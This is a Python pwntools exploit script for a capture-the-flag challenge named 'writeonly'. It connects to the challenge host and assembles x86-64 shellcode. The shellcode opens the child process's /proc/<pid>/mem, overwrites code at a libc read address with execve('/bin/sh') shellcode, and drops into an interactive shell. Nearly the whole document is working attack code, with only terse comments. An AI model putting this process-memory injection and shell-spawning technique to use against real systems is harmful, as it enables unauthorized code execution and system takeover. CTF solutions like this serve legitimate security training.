from pwn import *

elf = context.binary = ELF('./chal')
host = 'writeonly.2020.ctfcompetition.com'
port = 1337

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

p = start()
p.recvuntil('[DEBUG] child pid: ')
pid = int(p.recvline())

filename = '/proc/{}/mem'.format(pid).ljust(16, '\x00')

shellcode = ''

# Put filename on stack
for i in range(0, 16, 8):
	buf = hex(u64(filename[i : i + 8]))
	shellcode = 'mov rdx, {}; push rdx; '.format(buf) + shellcode

# Execute open and lseek, store fd in r9
# __libc_read at 0x44fcf0, store 8 bytes for '/bin/sh'
open_code = 'mov rdi, rsp; mov rsi, 0x2; mov rdx, 0x0; mov rax, 0x2; syscall; '
store_fd_code = 'mov r9, rax; '
lseek_code = 'mov rdi, rax; mov rsi, 0x44fce8; mov rax, 0x8; syscall; '
shellcode += open_code + store_fd_code + lseek_code
#print(shellcode)

# shellcode for system('/bin/sh')
binsh_code = '/bin/sh\x00' + asm('mov rdi, 0x44fce8; mov rsi, 0x0; mov rdx, 0x0; mov rax, 0x3b; syscall; ', arch='amd64')
binsh_code = binsh_code.ljust(40, '\x00')

# Put shellcode on stack
tmp = ''
for i in range(0, 40, 8):
	buf = hex(u64(binsh_code[i : i + 8]))
	tmp = 'mov rdx, {}; push rdx; '.format(buf) + tmp
shellcode += tmp

# Execute write
write_code = 'mov rdi, r9; mov rsi, rsp; mov rdx, 0x28; mov rax, 0x1; syscall; '
# Prevent parent process from exit
infinite_loop = 'jmp $;'
shellcode += write_code + infinite_loop
shellcode = asm(shellcode, arch='amd64')

# Get shell
log.info("Shellcode Length: {}".format(len(shellcode)))
p.recvuntil('shellcode length? ')
p.sendline(str(len(shellcode)))
p.recvuntil('bytes of shellcode. ')
p.sendline(shellcode)
p.interactive()
p.close()